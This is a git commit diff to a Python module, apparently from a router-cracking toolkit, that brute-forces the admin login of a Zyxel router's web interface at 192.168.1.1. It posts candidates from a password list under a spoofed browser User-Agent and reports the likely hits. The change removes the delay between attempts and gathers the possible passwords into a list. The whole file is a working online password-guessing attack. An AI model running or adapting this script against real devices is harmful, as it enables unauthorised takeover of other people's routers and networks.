00cbca644bf581fdae9dd35b3de4d912dfd736fc
Semih Özdemir <66450395+zyr1on@users.noreply.github.com>
2023-04-21 03:41:45 +0300

    Update zyxel.py

--- routerModules/zyxel.py
+++ routerModules/zyxel.py
@@ -1,20 +1,17 @@
 import requests
-from time import sleep
+import colorama
+from colorama import Fore,Style
 def exec(passlist):
     url = "http://192.168.1.1:80/login/login-page.cgi"
     headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36"}
+    possible_list = []
     for line in passlist:
         pass_ = line.strip("\n")
         data = {"AuthName": "admin", "AuthPassword": pass_}
-        req = requests.post(url,headers=headers,data=data)
-        sleep(0.25)
-        print("[*] Trying",pass_, req.status_code)
-        if not 'error' in req.text:
-            print("\n[+] Found ->",pass_)
-            break
-        if not "error" in str(req.content):
-            print("\n[+] Found ->",pass_)
-            break
-        if req.status_code == 403:
-            print("\n[?] Possibly" , pass_)
-            break
+        req = requests.post(url,headers=headers,data=data,allow_redirects=False)
+        print(Fore.YELLOW + "[-] Trying",pass_, req.status_code)
+        if not req.status_code == 200:
+            print(Fore.RED + "[?Possibly] " , pass_)
+            possible_list.append("[+] " + pass_)    
+    print("\nPossible Passwords")
+    print(Fore.GREEN, *possible_list,sep="\n")
